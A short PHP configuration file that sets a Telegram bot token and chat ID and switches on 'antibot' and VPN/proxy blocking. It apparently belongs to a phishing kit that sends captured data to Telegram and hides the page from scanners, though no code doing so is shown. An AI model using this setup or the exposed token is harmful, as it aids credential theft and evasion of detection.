<?php 




$bot = "7359753507:AAFLhYeXvTZP_ca88qXjrmgFjsk74ZY4QaM";
$chat_id = "5911112755";


// use antibot? yes|no
$antibot = "yes";

// want to block all VPNs/PROXIES? yes|no
$block_proxy = "yes";




?>